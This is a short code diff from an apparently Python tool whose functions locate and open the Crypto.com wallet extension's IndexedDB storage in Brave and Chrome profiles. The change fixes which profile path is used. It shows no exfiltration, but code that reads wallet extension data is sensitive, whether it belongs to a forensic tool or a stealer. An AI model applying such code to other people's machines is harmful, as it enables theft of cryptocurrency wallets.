@@ -100,7 +100,7 @@ def cryptocom_brave():
 
     if default_list:
         try:
-            data_location = appdata_dir + browser_path + "/" + profiles_list[x] + "/IndexedDB/chrome-extension_" + ext_id + "_0.indexeddb.leveldb"
+            data_location = appdata_dir + browser_path + "/" + default_list[0] + "/IndexedDB/chrome-extension_" + ext_id + "_0.indexeddb.leveldb"
             wrapper = ccl_chromium_indexeddb.WrappedIndexDB(data_location)
         
         except:
@@ -206,7 +206,7 @@ def cryptocom_chrome():
 
     if default_list:
         try:
-            data_location = appdata_dir + browser_path + "/" + profiles_list[x] + "/IndexedDB/chrome-extension_" + ext_id + "_0.indexeddb.leveldb"
+            data_location = appdata_dir + browser_path + "/" + default_list[0] + "/IndexedDB/chrome-extension_" + ext_id + "_0.indexeddb.leveldb"
             wrapper = ccl_chromium_indexeddb.WrappedIndexDB(data_location)
         
         except:
